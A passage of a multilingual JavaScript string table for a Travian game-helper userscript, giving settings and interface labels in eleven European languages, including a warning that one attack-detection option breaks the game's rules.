		redbl : "Crveno (u satima)",
		yellowbl: "Žuto (u satima)",
		marketpl : "Tržnica",
		mfilter : "Filter",
		mfiltero : ['Isključeno','Samo omjer','Samo filter','Potpuno'],
		npcsum : "Sažetak za NPC",
		npcsumh : 'Prikaz u tržnici i zgradama',
		bidinc : "Povećanje ponude",
		bidinch : 'Koristi se za aukcije (Travian 4)',
		show3x : "Predviđanje kretanja kod 2x i 3x",
		show3xh : 'Pokušava predvijeti kretanje resursa kod slanja 2x i 3x (Može prikazati neispravne podatke)',
		rpandmp : "Okupljalište i Tržnica",
		incomres : "Informacije o dolazećim resursima",
		incomreso : ['Isključeno','Uključeno','S kratkim pregledom','WW mod'],
		troopsI : "Informacije o trupama",
		troopsIo : ['Isključeno','Uključeno','Skeniraj upute'],
		defRP : "Predpostavljena akcija za slanje vojske",
		showls : "Prikaži poveznice",
		showAsSN : "Koristi naziv poveznice kao drugo ime lokacije",
		showlso : ['Isključeno','Uključeno','U zasebnom prozoru'],
		savedls : "Spremljene poveznice",
		savedd : "Pohranjeni podaci",
		saveddh : 'Uključuje linkove i druge nazive naselja. Korisno ako se račun briše ili ne koristi na Vašem računalu.',
		savedelall : "Izbriši sve pohranjene podatke",
		savedelallh : 'Jeste li sigurni da želite izbrisati sve pohranjene podatke, uključujući linkove i druge nazive naselja?',
		scrlang : "Jezik skripte",
		youlang : "Tvoj jezik",
		notifi : "Obavijest",
		notification : "obavijest nakon gradnje",
		method : "Metoda",
		audiourl : "URL audio datoteke",
		audiotest : "Testiraj audio",
		colorCustomize : "Opcije boja",
		colorHint : "Pustiti prazno za predpostavljenu boju",
		color0 : "Nadogradnja dostupna",
		color1 : "Nadogradnja dostupna putem NPC-a",
		color2 : "Nadogradnja nije dostupna <br/>(Manjak resursa)",
		color3 : "Nadogradnja nije dostupna <br/>(Nedovoljna razina Skladišta/Žitnica)",
		color4 : "Nadograđeno do kraja"
	},
	bs: { fb : "hr", // Bosnian
		arena : "Mejdan",
		marketpl : "Pijaca",
		npcsumh : 'Prikaz na pijaci i zgradama',
		rpandmp : "Mjesto okupljanja i Pijaca",
		color3 : "Nadogradnja nije dostupna (Nedovoljna razina Skladišta/Silosa)"
	},
	de: { // German language, thx proll007
		// ingame messages
		ok : "Ok",
		cancel : "Abbrechen",
		close : "Schliessen",
		overview : "Ueberblick",
		svers : "Script Version",
		settings : "Einstellungen",
		notes : "Notizen",
		res90 : "Ressourcen zu % gefuellt",
		refresh : "Refresh",
		warehouse : "Warenhaus",
		resources : "Ressourcen",
		troops : "Einheiten",
		links : "Links",
		linkname : "Linkname",
		linkdel : "Link loeschen",
		name2 : "Zweiter Name",
		archive : "Archiv",
		arena : "Arena",
		addcur : "aktuelle hinzufuegen",
		del : "loeschen",
		edit : "bearbeiten",
		total : "Total",
		// settings
		info : "Information",
		yourrace : "Deine Rasse",
		speedart : "Geschwindigkeitsartefakt",
		racelist : ['Roemer','Teutonen','Gaulier'],
		onallp : "Alle Seiten",
		dontwrap : "Keine Seitenumbrueche (slow)",
		dontwraph : 'Wenn die Liste der Doerfer nach unten springt',
		buildand : "Zeige den Countdown fuer Gebaeude und Einheiten",
		buildandh : 'In der Liste der Doerfer',
		sendres : "Zeige &laquo;sende Ressourcen/Truppen&raquo; Icons",
		sendmess : "Zeige &laquo;sende Nachricht&raquo; Icons",
		analyzer : "World-Analyzer",
		bigicon : "Zeige grosse Icons",
		opennote : "Oeffne Notizen automatisch",
		resbar : "Ressourcenleiste",
		showres : "Zeige Ressourcenleiste im Fenster",
		redbl : "Rot (in Stunden)",
		yellowbl: "Gelb (in Stunden)",
		marketpl : "Marktplatz",
		mfilter : "Filter",
		mfiltero : ['aus','nur Rate','nur Filter','voll'],
		rpandmp : "Versammlungsplatz und Marktplatz",
		incomres : "eingehende Ressourceninfo",
		incomreso : ['aus','an','mit Summe','WW mode'],
		showls : "Zeige Links",
		showlso : ['aus','an','im Fenster'],
		savedls : "Gespeicherte Links",
		scrlang : "Scriptsprache",
		youlang : "Deine Sprache",

		// add by Cyrusx
		none : 'Nichts',
		hunger : "Hunger",
		duration : "Dauer",
		deficit : "Mangel",

		troopsI : "Information über Truppen",
		troopsIo : ['aus','an','scan Hilfe'],
		notification : "Benachrichtigung wenn Bau komplett",
		method : "Methode",
		audiourl : "URL der Audiodatei",
		audiotest : "Audiotest",
		auto : "auto",

		builtin : "Eingebaute Tools",
		builtinh : 'zur Vereinheitlichung der Produktion: Rot - meist benötigte Ressource, Grün - am wenigsten benötigte Ressource',
		normalize : 'Vereinheitlichung der Produktion',
		normal : "Normal",
		banalyze : "Eingebaute Kampfanalyse",
		cropfind : "Eingebauter Getreidefinder",
		addvtable : "Zeige zusätzliche Dorfübersicht",
		addvtableh : 'Für Travian4',
		npcsum : "NPC Übersicht",
		npcsumh : 'Im Marktplatz und Gebäuden',
		bidinc : "Gebotserhöhung",
		bidinch : 'Für Auktionen in Travian4',
		defRP : "Voreinstellung für Versammlungsplatz",
		savedd : "gespeichert",
		saveddh : 'gespeicherte Links sowie Name, falls Account gelöscht oder nicht Dein Computer',
		savedelall : "Lösche alle gespeicherten Dateien",
		savedelallh : 'Wirklich alles Löschen, inkl. Links und Name?',
		notifi : "Benachrichtigung"
	},
	pt: { // Portuguese language, thx Kendra
		//traduzido por Miguel & Sam - br7
		// mensagens no jogo
		ok : "Ok",
		cancel : "Cancelar",
		close : "Fechar",
		overview : "Resumo",
		svers : "Versão do Script",
		settings : "Definições",
		notes : "notas",
		res90 : "% de recursos para encher",
		refresh : "atualizar",
		warehouse : "Armazém",
		resources : "Recursos",
		troops : "Tropas",
		links : "Links",
		linkname : "nome do link",
		linkdel : "apagar link",
		name2 : "segundo nome",
		archive : "Arquivo",
		arena : "Praça de Torneios",
		addcur : "adicionar atual",
		del : "apagar",
		edit : "editar",
		unfix : "soltar",
		fix : "fixar",
		total : "Total",
		noplace : "Não tem mais espaço!",
		hunger : "fome",
		duration : "duração",
		deficit : "em falta",
		aclock : "Alarme\nhh:mm:ss , hh:mm , mm (a partir de agora)",
		consnegat : "O consumo na aldeia está negativo. Quantos minutos precisará de reserva?",
		searchlast : "Procurar o ultimo",
		bmove : "Mover Edificio",
		neighbors : "vizinhos",
		// definições
		none : "Nenhum",
		auto : "automático",
		info : "Informação",
		yourrace : "Sua raça",
		sspeed : "Servidor speed",
		sspeedh : "0 - automático, 1 (1x), 2 (2x), 3 (3x), ... etc.",
		speedart : "Velocidade do artefato",
		racelist : ['Romanos','Teutões','Gauleses'],
		cranny : "Nível do cereal por celeiro (Porcentagem)",
		crannyh : 'Pré-definido com 80%, 70% para pilhagem normal ou artefato',
		builtin : "Ferramentas Internas",
		builtinh : 'Para equilibrar a produção: a cor Vermelha - recursos que mais precisam; Verde - recursos que menos precisam',
		normalize : 'Equilibrar a produção',
		normal : "normal",
		banalyze : "Analisador de Ataque",
		cropfind : "Localizador de Crop's",
		adetect : "Detectar ataques",
		adetecto : ['Desligado','Modo Congelado','Ligado'],
		adetecth : "Esta opção utiliza ações ocultas no servidor, violando as regras. Poderá levar a punição do jogo.",
		adetectt : "periodo de detectar ataques",
		buildhint : "Dicas de Construção",
		onallp : "Todas as páginas",
		dontwrap : "Não rolar páginas (lento)",
		dontwraph : 'Se a lista das aldeias pular para baixo',
		buildand : "Mostrar construção em contagem regressiva e atacar",
		buildandh : 'Na lista das aldeias',
		buildands : ['Desligado','Ligado','Amplo'],
		sendres : "Mostrar &laquo;Enviar reforços/tropas&raquo; icons",
		sendmess : "Mostrar &laquo;Enviar mensagem&raquo; icons",
		analyzer : "Site de ferramenta de analise",
		bigicon : "Mostrar ícones grandes",
		addvtable : "Mostrar tabela de aldeias",
		addvtableo : ['Desligado','Ligado','Bloqueado'],
		addvtableh : 'para Travian T4',
		opennote : "Abrir notas automaticamente",
		notesize : "Tamanha da janela para notas",
		openoview : "Abrir visão detalhada das aldeias",
		resbar : "Barra de Recursos",
		showres : "Mostrar barra de recursos na janela",
		redbl : "vermelho (em horas)",
		yellowbl: "amarelo (em horas)",
		marketpl : "Mercado",
		mfilter : "filtro",
		mfiltero : ['desligado','taxa única','somente filtro','cheio'],
		npcsum : "Resumo para NPC",
		npcsumh : 'Apareçe nos mercado e nos edificios',
		bidinc : "Valor aumentado automaticamente no leilão",
		bidinch : 'Só disponivel para a versão Travian 4',
		show3x : "Fluxo de recursos",
		show3xh : 'Tentativa de prever o fluxo de recursos no envio de 2x e 3x (Pode mostrar dados incorretos)',
		rpandmp : "Ponto de encontro e Mercado",
		incomres : "informações de recursos recebidos",
		incomreso : ['desligado','ligado','com sumário','Modo WW'],
		troopsI : "Informações sobre as tropas",
		troopsIo : ['Desligado','Ligado','Actualizado'],
		defRP : "Ação pré-definida no envio de tropas",
		showls : "Mostrar links",
		showAsSN : "Usar links como segundo nome",
		showlso : ['desligado','ligado','na janela'],
		savedls : "Links salvos",
		savedd : "Salvar dados",
		saveddh : 'incluindo links e segundo nome. Se uma conta excluída, ou não o seu computador.',
		savedelall : "Apagar todos os dados salvos",
		savedelallh :  'Tem certeza que deseja apagar todos os dados, incluindo os links e o segundo nome?',
		scrlang : "Idioma do Script",
		youlang : "Seu idioma",
		notifi : "Notificações",
		notification : "notificação após a construção",
		method : "Método",
		audiourl : "Link do ficheiro de audio",
		audiotest : "Testar Audio",
		colorCustomize : "Opções de Cores",
		colorHint : "Deixe em branco para a cor padrão",
		color0 : "Pronto para evoluir",
		color1 : "Evoluir fazendo NPC",
		color2 : "Não é possível evoluir <br/>(Falta de recursos)",
		color3 : "Não é possível evoluir <br/>(Não tem armazem e/ou celeiro suficiente)",
		color4 : "Completamente Evoluido"
	},
	bg: { // Bulgarian language, thx Mitko
		// ingame messages
		ok : "ок",
		cancel : "Отказ",
		close : "Затвори",
		overview : "Преглед",
		svers : "Версия на Скрипа",
		settings : "Опции",
		notes : "Бележки",
		res90 : "ресурси на % пълни",
		refresh : "Рефреш",
		warehouse : "Склад",
		resources : "Ресурси",
		troops : "Войници",
		links : "Връзки",
		linkname : "Име на връзката",
		linkdel : "Изтрий връзката",
		name2 : "второ име",
		archive : "Архив",
		arena : "Арена",
		addcur : "Добави кординати",
		del : "Изтрий",
		edit : "редактирай",
		total : "Общо",
		noplace : "Няма място!",
		hunger : "Глад",
		duration : "продължителност",
		deficit : "дефицит",
		// settings
		none : 'Никой',
		info : "Информация",
		yourrace : "Твоята раса",
		speedart : "Скорост на артефакта",
		racelist : ['Римляни','Тевтонци','Гали'],
		onallp : "Всички страници",
		dontwrap : "Не сменяй страници",
		dontwraph : 'Списъка на селата скача долу',
		buildand : "Покажи отброяване за сгради и атаки",
		buildandh : 'Във списъка на селата ',
		sendres : "Виж &laquo;изпрати ресурс / войска&raquo;",
		sendmess : "Виж &laquo;изпрати съобщение&raquo;",
		analyzer : "Световната анализатор",
		bigicon : "Покажи големи икони",
		opennote : "Автоматично отваряне на бележки",
		resbar : "Ресурсен бар",
		showres : "Покажи ресурсния бар в прозорец",
		redbl : "червено (във часове)",
		yellowbl: "жълт (във часове)",
		marketpl : "Пазар",
		mfilter : "Филтери",
		mfiltero : ["изключено", "само курс", "само филтър", "пълно"],
		rpandmp : "Сборен пунк и Пазар",
		incomres : "входящи ресурси информация",
		incomreso : ["изключено", "включено ","обобщена", "WW режим"],
		troopsI : "Информация за войници",
		troopsIo : ["изключено", "включено ","сканиране помощ"],
		showls : "Покажи връзки",
		showlso : ["изключено", "включено ","в прозореца"],
		savedls : "запазени връзки",
		scrlang : "Език на скрипта",
		youlang : "Твоят език",
		notification : "уведомление след строителство",
		method : "метод",
		audiourl : "URL на аудио файл",
		audiotest : "Тест"
	},
	ro: { // Romanian language, thx bubulu
		// ingame messages
		ok : "Ok",
		cancel : "Cancel",
		close : "inchide",
		overview : "privire generala",
		svers : "versiune script",
		settings : "setari",
		notes : "note",
		res90 : "resurse pina la %",
		refresh : "reimprospatare",
		warehouse : "depozit",
		resources : "Resurse",
		troops : "Trupe",
		links : "Links",
		linkname : "nume link",
		linkdel : "sterge link",
		name2 : "al doilea nume",
		archive : "Arhiva",
		arena : "arena",
		addcur : "adauga curent",
		del : "sterge",
		edit : "editeaza",
		total : "Total",
		noplace : "nu este loc!",
		hunger : "foame",
		duration : "durata",
		deficit : "deficit",
		// settings
		none : 'None',
		info : "Informatii",
		yourrace : "rasa dvs.",
		speedart : "artefact de viteza",
		racelist : ['Romani','Barbari','Daci'],
		onallp : "Toate paginile",
		dontwrap : "Don't wrap pages",
		dontwraph : 'daca lista de sate sare jos',
		buildand : "Arata numaratoarea inversa constructie si de atac",
		buildandh : 'in lista satelor',
		sendres : "Arata icoana &laquo;trimite resurse/trupe&raquo;",
		sendmess : "Arata icoana &laquo;trimite mesaj&raquo;",
		analyzer : "World analyzer",
		bigicon : "Arata icoane mari",
		opennote : "aplica notele automat",
		resbar : "bara de resurse",
		showres : "afiseaza bara de resurse in fereastra",
		redbl : "rosu (in ore)",
		yellowbl: "galben(in ore)",
		marketpl : "Targ",
		mfilter : "filter",
		mfiltero : ['off','only rate','only filter','full'],
		rpandmp : "Punct intalnire si Targ",
		incomres : "info resurce ce sosesc",
		incomreso : ['off','on','with summary','WW mode'],
		troopsI : "informatii despre trupe",
		troopsIo : ['off','on','scan help'],
		showls : "Show links",
		showlso : ['off','on','in window'],
		savedls : "linkuri salvate",
		scrlang : "limba script",
		youlang : "limba ta",
		notification : "notificare dupa constructie",
		method : "metoda",
		audiourl : "URL of audio file",
		audiotest : "test audio"
	},
	sr: { // Serbian language, thx jokusaet
		// ingame messages
		ok : "Ok",
		cancel : "Откажи",
		close : "Затвори",
		overview : "Преглед",
		svers : "Верзија скрипте",
		settings : "Подешавања",
		notes : "Белешке",
		res90 : "Ресурси до % попуњености",
		refresh : "Освежи",
		warehouse : "Складиште",
		resources : "Ресурси",
		troops : "Јединице",
		links : "Линкови",
		linkname : "Име линка",
		linkdel : "Обриши линк",
		name2 : "Друго име",
		archive : "Архива",
		arena : "Витешка арена",
		addcur : "Додај тренутну страну",
		del : "Обриши",
		edit : "Измени",
		total : "Укупно",
		noplace : "Нема довољно места!",
		hunger : "Глад",
		duration : "Трајање",
		deficit : "Дефицит",
		// settings
		none : "Ништа",
		auto : "Ауто",
		info : "Инфо",
		yourrace : "Твоја раса",
		speedart : "Артефакт брзих",
		racelist : ['Римљани','Тевтонци','Гали'],
		cranny : "Жути ниво силоса (проценат)",
		crannyh : 'нормално 80, 70 ѕа класично и артефакт',
		builtin : "Уграђени алати",
		builtinh : 'за нормализацију производње: црвена боја - најпотребнији ресурси, зелена - мање потребни ресурси',
		normalize : 'нормализација производње',
		normal : "нормално",
		banalyze : "уграђен анализатор битке",
		cropfind : "уграђени претраживач житница",
		onallp : "све стране",
		dontwrap : "не умотавај стране",
		dontwraph : 'ако је листа села, скочи доле',
		buildand : "покажи одбројавање грађевина и напад",
		buildandh : 'У листи села',
		sendres : "Прикажи &laquo;пошаљи ресурсе/јединице&raquo; иконе",
		sendmess : "Прикажи &laquo;пошаљи поруку&raquo; иконе",
		analyzer : "World analyzer",
		bigicon : "Прикажи ВЕЛИКЕ иконе",
		addvtable : "Прикажи додатну табелу са листом села",
		addvtableh : 'за Т4',
		opennote : "Аутоматски отвори белешке",
		resbar : "Табела са ресурсима",
		showres : "Прикажи табелу са ресурсима у прозору",
		redbl : "црвено (у сатима)",
		yellowbl: "жуто (у сатима)",
		marketpl : "Пијаца",
		mfilter : "филтер",
		mfiltero : ['искључен','само однос','само филтер','пуно'],
		npcsum : "сума за НПЦ",
		npcsumh : 'у пијаци и зградама',
		bidinc : "повећање понуде на берзи",
		bidinch : 'за аукције на Т4',
		rpandmp : "Место окупљања и Пијаца",
		incomres : "инфо о долазећим ресурсима",
		incomreso : ['искључен','укључен','са сумом','WW мод'],
		troopsI : "Информације о јединицама",
		troopsIo : ['искључено','укључено','помоћ при скенирању'],
		defRP : "подразумевана акција у месту окупљања",
		showls : "Прикажи линкове",
		showlso : ['искључено','укључено','у прозору'],
		savedls : "сачувани линкови",
		savedd : "сачувани подаци",
		saveddh : 'укључујући линкове и друго име. Уколико је налог обрисан, или није твој компјутер.',
		savedelall : "обриши све сачуване податке",
		savedelallh : 'Да ли си сигуран да желиш да обришеш све сачуване податке, укључујући и линкове и друго име?',
		scrlang : "Језик скрите",
		youlang : "твој језик",
		notifi : "нотификација",
		notification : "нотификација за изградњу",
		method : "метода",
		audiourl : "УРЛ аудио фајла",
		audiotest : "тестирај аудио",
		// thx Stevan
		neighbors : "суседи",
		colorCustomize : "Опције боја",
		colorHint : "остави празно за предефинисане боје",
		color0 : "надоградња могућа",
		color1 : "надоградња кроз НПЦ",
		color2 : "надоградња није могућа<br/>(нема довољно ресурса)",
		color3 : "надоградња није могућа<br/>(недовољан капацитет силоса/складишта)",
		color4 : "последњи ниво"
	},
	pl: { // Polish translation, thx aren
		// ingame messages
		ok : "Ok",
		cancel : "Anuluj",
		close : "Zamknij",
		overview : "Przegląd",
		svers : "wersja skryptu",
		settings : "ustawienia",
		notes : "notatki",
		res90 : "środków na % napełniania",
		refresh : "odśwież",
		warehouse : "Magazyn",
		resources : "Surowce",
		troops : "Jednostki",
		links : "Linki",
		linkname : "nazwa linka",
		linkdel : "usuń link",
		name2 : "druga nazwa",
		archive : "Archiwum",
		arena : "Plac Turniejowy",
		addcur : "dodaj bieżący",
		del : "usuń",
		edit : "edytuj",
		total : "Razem",
		noplace : "Nie ma miejsca!",
		hunger : "głód",
		duration : "czas trwania",
		deficit : "deficyt",
		// settings
		none : "Brak",
		auto : "auto",
		info : "Informacja",
		yourrace : "Twoja rasa",
		speedart : "Prędkość artefaktu",
		racelist : ['Rzymianie','Germanie','Galowie'],
		cranny : "żółty poziom kryjówki (procent)",
		crannyh : 'normalny 80, 70 do grabieży na klasycznym lub artefakcie',
		builtin : "Wbudowane narzędzia",
		builtinh : 'dla normalizacji produkcji: kolor czerwony - najwięcej środków potrzeba, zielony - potrzeba mniej zasobów',
		normalize : 'normalizacja produkcji',
		normal : "normalny",
		banalyze : "Wbudowany analizator bitwy",
		cropfind : "Wbudowany poszukiwacz cropów",
		onallp : "Wszystkie strony",
		dontwrap : "Nie zawijaj stron",
		dontwraph : 'Jeżeli lista osad przeskocz w dól',
		buildand : "Pokaz odliczanie budynku i ataku",
		buildandh : 'Na liście osad',
		sendres : "Pokaz &laquo;wyślij surowce/jednostki&raquo; ikony",
		sendmess : "Pokaz &laquo;wyślij wiadomość&raquo; ikony",
		analyzer : "World analyzer",
		bigicon : "Pokaz DUŻE ikony",
		addvtable : "Pokaz dodatkowa tablice osad",
		addvtableh : 'dla travian4',
		opennote : "Automatycznie otwórz notatnik",
		resbar : "Tabela surowców",
		showres : "Pokaz tabele surowców w oknie",
		redbl : "czerwony (w godzinach)",
		yellowbl: "żółty (w godzinach)",
		marketpl : "Rynek",
		mfilter : "filter",
		mfiltero : ['off','tylko stawki','tylko filter','wszystko'],
		npcsum : "podsumowanie dla NPC",
		npcsumh : 'na rynku i budynkach',
		bidinc : "przebicie oferty",
		bidinch : 'na aukcji travian4',
		rpandmp : "Miejsce zbiórki i Rynek",
		incomres : "informacja o przychodzących surowcach",
		incomreso : ['off','on','z podsumowaniem','WW mode'],
		troopsI : "Informacja o jednostkach",
		troopsIo : ['off','on','scan help'],
		defRP : "domyślna akcja dla Miejsca zbiórki",
		showls : "Pokaz linki",
		showlso : ['off','on','w oknie'],
		savedls : "zapisane linki",
		savedd : "zapisane dane",
		saveddh : 'w tym Linki i Druga nazwa. Jeśli konto usunięte, albo nie twój komputer.',
		savedelall : "usunąć wszystkie zapisane dane",
		savedelallh : 'Czy na pewno chcesz usunąć wszystkie dane, w tym linki i druga nazwe?',
		scrlang : "Język skryptu",
		youlang : "twój język",
		notifi : "powiadomienie",
		notification : "powiadomienia po zakończeniu budowy",
		method : "metoda",
		audiourl : "Adres URL pliku audio",
		audiotest : "test audio"
	},
	sv:{ // Swedish translation, thx Dragon from the future
		// Meddelande,
		ok : "Ok",
		cansel : "Avbryt",
		close : "Stäng",
		Overview : "överblick",
		svers : "script version",
		setting : "inställningar",
		notes : "Anteckningar",
		res90 : "Resurser över 90 %",
		refresh : "Uppdatera",
		warehouse : "Magasin",
		resources : "Råvaror",
		troops : "Soldater",
		links : "Länkar",
		linkname : "Länknamn",
		linkdel : "Radera länk",
		name2 : "Andra namn",
		archive : "Arkiv",
		arena : "Torneplats",
		addcur : "Lägg till nuvarande",
		del : "radera",
		edit : "ändra",
		total : "Totalt",
		noplace : "Det finns ingen plats",
		hunger : "Svält",
		duration : "Varaktighet",
		deficit : "Underskott",
		// inställningar
		none : "Inga",
		auto : "auto",
		info : "Information",
		yourrace : "Din stam",
		speedart : "Titanskor",
		racelist : ['Romare','Germaner','Galler'],
		cranny : "Gul nivå på grotta (procent)",
		crannyh : "Normal 80, 70 för klssisk eller artefakt-plundrare",
		builtin : "Inbyggda hjälpmedel",
		builtinh : "För att återställa produktionen: röd färg - Behövs mest resurser, green - behövs mindre resurser",
		normalize : "Återställ produktionen",
		normal : "normal",
		banalyze : "inbyggd analysator för slag",
		cropfins : "inbyggd veteby-finnare",
		onallp : "Alla sidor",
		dontwrap : "Byt inte sidor",
		dontwraph : "Om bylistan hoppar ner",
		buildand : "Visa byggnings och attack nedräkning",
		buildandh : "I bylistan",
		sendres : "Visa &laquo;sänd råvaror/trupper&raquo; ikoner",
		sendmess : "Visa Skicka meddelande ikoner",
		analyzer : "Världsanalysator",
		bigicon : "Visa STORA ikoner",
		addvtable : "Visa extra bylista",
		addvtableh : "För travian 4",
		opennote : "Öppnar automatisk anteckningar",
		resbar : "Råvaror-fält",
		showres : "Visa råvaror-fältet i ett eget fönster",
		redbl : "röd (i timmar)",
		yellowbl : "yellow (i timmar)",
		marketpl : "Marknadsplats",
		mfilter : "Filter",
		mfiltero : ['av','Endast värde','Endast filter','full'],
		npcsum : "summering för NPC",
		npcsumh : "I marknadsplats och och byggnader",
		incomres : "ikommande råvaro-info",
		incomreso : ['av','på','med sammanfattning','Världsunder'],
		troppsl : "Information om soldaterna",
		troopslo : ['av','på','i fönster'],
		defRP : "Förvald attacktyp på samlingsplats",
		showls : "Visa länkar",
		showlso : ['av','på','i fönster'],
		savedls : "sparade länkar",
		savedd : "sparad data",
		saveddh : 'Inkluderar länkar och andra-namn. Är ett konto raderat, eller inte din dator.',
		savedelall : "Radera all sparad data",
		savedelallh : 'Är du säker på att du vill radera all data, länkar och andra namnpå byar?',
		scrlang : "Script språk",
		youlang : "ditt språk",
		notifi : "notifikation",
		notification : "Notifikation efter byggande",
		method : "metod",
		audiourl : "URL för ljudfil",
		audiotest : "ljudtest"
	},
	it: { // Italian translation , Dragonflame
		// ingame messages
		ok : "Ok",
		cancel : "Cancella",
		close : "Chiudi",
		overview : "Mostra",
		svers : "Versione dello script",
		settings : "Configurazione",
		notes : "Blocco note",
		res90 : "Risorse a % della capacità",
		refresh : "Aggiorna",
		warehouse : "Magazzino",
		resources : "Risorse",
		troops : "Truppe",
		links : "Links",
		linkname : "Nome del link",
		linkdel : "Cancella link",
		name2 : "Secondo Nome",
		archive : "Archivio",
		arena : "Arena",
		addcur : "Aggiungi corrente",
		del : "Cancella",
		edit : "Modifica",
		total : "Totale",
		noplace : "Non c'è posto!",
		hunger : "Fame",
		duration : "Durata",
		deficit : "Deficit",
		// settings
		none : 'Nessuno',
		auto : "auto",
		info : "Informazioni",
		yourrace : "La tua Tribù:",
		speedart : "Artefatto velocità",
		racelist : ['Romani','Teutoni','Galli'],
		cranny : "Livello giallo della capacità del deposito segreto (%)",
		crannyh : 'Normalmente 80; Per il server classico o per artefatto del Ladro 70;',
		builtin : "Strumenti Integrati",
		builtinh : 'Per la produzione ottimizzata: Rosso = Servono più risorse; Verde = servono meno risorse;',
		normalize : 'Produzione ottimizzata',
		normal : "Risorse",
		banalyze : "Analizzatore di Battaglia integrato",
		cropfind : "Trova Canarini integrato",
		adetect : "Rilevatore d'attacchi",
		adetecto : ['Spento','Senza Blocco','Acceso'],
		adetecth : "Fa richieste al server di nascosto, violando le regole. Punibile.",
		adetectt : "Periodo di rilevamento attacco",
		onallp : "Su tutte le pagine",
		dontwrap : "Non chiudere le pagine",
		dontwraph : 'Se la lista dei villaggi si modifica',
		buildand : "Mostra il conto alla rovescia per gli edifici e gli attacchi",
		buildandh : 'Nella lista dei villaggi',
		sendres : "Mostra le icone «invia risorse / truppe»",
		sendmess : "Mostra icone «invia messaggio»",
		analyzer : "World analyzer",
		bigicon : "Mostra icone di grandi dimensioni",
		addvtable : "Mostra una tabella villaggi aggiuntiva ",
		addvtableh : 'Per Travian 4',
		opennote : "Aprire il blocco note automaticamente",
		resbar : "Tabella delle Risorse",
		showres : "Mostra la tabella delle risorse in una finestra",
		redbl : "Rosso (in ore)",
		yellowbl: "Giallo (in ore)",
		marketpl : "Mercato",
		mfilter : "Filtri",
		mfiltero : ['Nessuno','Solo tasso','Solo filtro','Tutti'],
		npcsum : "Riepilogo per NPC",
		npcsumh : 'Nel mercato e negli edifici',
		bidinc : "Incremento dell'offerta",
		bidinch : 'Per le aste travian4',
		rpandmp : "Base Militare e Mercato",
		incomres : "Info sulle risorse in arrivo",
		incomreso : ['No','Si','Con risultati','Modalità Meraviglia'],
		troopsI : "Informazioni sulle truppe",
		troopsIo : ['Spento','Acceso','Scansione di aiuto'],
		defRP : "Azione predefinita per «Invia truppe»",
		showls : "Mostra link",
		showlso : ['No','Si','In una finestra'],
		savedls : "Salva link",
		savedd : "Salva Dati",
		saveddh : 'Incluso Links e Secondo nome. Se un Account viene cancellato, o non è il tuo computer.',
		savedelall : "Cancella tutti i dati",
		savedelallh : 'Sei sicuro di voler cancellare tutti dati, incluso i links ed i Secondi nomi?',
		scrlang : "Scelta della lingua",
		youlang : "Lingua del browser",
		notifi : "Notifiche",
		notification : "Notifica dopo il completamento della construzione",
		method : "Metodo",
		audiourl : "URL del file audio",
		audiotest : "test audio"
	},
	es: {// Spanish translation. neonsp
		// ingame messages
		ok : "Ok",
		cancel : "Cancelar",
		close : "Cerrar",
		overview : "Vista previa aldeas",
		svers : "Versión Script",
		settings : "Ajustes",
		notes : "notass",
		res90 : "recursos hasta % llenado",
		refresh : "actualizar",
		warehouse : "Almacen",
		resources : "Recursos",
		troops : "Tropas",
		links : "Enlaces",
		linkname : "Nombre enlace",
		linkdel : "Borrar enlace",
		name2 : "Segundo nombre",
		archive : "Archivo",
		arena : "Plaza de torneos",
		addcur : "añadir actual",
		del : "borrar",
		edit : "editar",
		unfix : "unfix",
		fix : "fix",
		total : "Total",
		noplace : "No hay sitio!",
		hunger : "Hambre",
		duration : "duración",
		deficit : "Deficit",
		aclock : "Alarma Reloj\nhh:mm:ss , hh:mm , mm (desde ahora)",
		consnegat : "El consumo en esta aldea es negativoive. Cuantos minutos necesita de reserva?",
		searchlast : "Buscar el último de",
		bmove : "Mover edificios",
		neighbors : "vecinos",
		// settings
		none : "Ninguno",
		auto : "auto",
		info : "Información",
		yourrace : "Raza",
		speedart : "Artefacto de velocidad",
		racelist : ['Romanos','Germanos','Galos'],
		cranny : "Nivel amarillo para el granero ( porcentaje )",
		crannyh : 'normal 80, 70 para clásico o artefacto de saqueo',
		builtin : "Herramientas adjuntas",
		builtinh : 'Para normalizar la producción: Rojo - Más recursos necesarios, Verde - menos recursos necesarios',
		normalize : 'Normalizado de la producción',
		normal : "normal",
		banalyze : "Analizador de batallas",
		cropfind : "Buscador de cerealeras",
		adetect : "Detectar ataques",
		adetecto : ['No','Sin pausa','Si'],
		adetecth : "realiza peticiones en segundo plano al servidor, violando las normas. Puedes ser sancionado por ello.",
		adetectt : "Frecuencia de detección de ataques",
		buildhint : "Consejos de construcción",
		onallp : "Todas las páginas",
		dontwrap : "No ajustar páginas",
		dontwraph : 'Si la lista de aldeas pasa abajo',
		buildand : "Mostrar cuenta atrás de construcciones y ataques",
		buildandh : 'En la lista de aldeas',
		buildands : ['Si','No','Ancho'],
		sendres : "Mostrar iconos de &laquo;enviar recursos/tropas&raquo; ",
		sendmess : "Mostrar iconos de &laquo;enviar mensaje&raquo; ",
		analyzer : "Analizador del Mapa",
		bigicon : "Mostrar iconos grandes",
		addvtable : "Mostrar tabla adicional de aldea",
		addvtableo : ['Si','No','Fijado'],
		addvtableh : 'para Travian4',
		opennote : "Abrir automáticamente las notas",
		notesize : "Tamaño de la ventana de notas",
		openoview : "Abrir automáticamente visión general de aldeas",
		resbar : "Barra de recursos",
		showres : "Mostrar recursos en la ventana",
		redbl : "Rojo (en horas)",
		yellowbl: "Amarillo (en horas)",
		marketpl : "Mercado",
		mfilter : "Filtro",
		mfiltero : ['Si','Solo ratio','Solo filtro','Completo'],
		npcsum : "Resumen para NPC",
		npcsumh : 'en mercado y edificios',
		bidinc : "Aumento de puja",
		bidinch : 'Para subastas de Travian4',
		show3x : "Intentar predecir el flujo de recrusos con doble y triple envio",
		show3xh : 'Puede ser incorrecto',
		rpandmp : "Plaza de reuniones y mercado",
		incomres : "Información de recursos entrantes",
		incomreso : ['Si','No','Con resumen','Modo maravilla'],
		troopsI : "Information about the troops",
		troopsIo : ['Si','No','Ayuda de escaneo'],
		defRP : "Acción por defecto en plaza reuniones",
		showls : "Mostrar enlaces",
		showAsSN : "Usar enlaces con el segundo nombre",
		showlso : ['Si','No','en ventana'],
		savedls : "Enlaces guardados",
		savedd : "Datos guardados",
		saveddh : 'Incluyendo enlaces y segundo nombre. If an Account deleted, or not your computer.',
		savedelall : "Borrar todos los datos almacenados",
		savedelallh : '¿Realmente deseas borrar todo los datos, incluyendo los enlaces y segundos nombres?',
		scrlang : "Idioma del Script",
		youlang : "Tu idioma",
		notifi : "notificación",
		notification : "Notificación al finalizar construción",
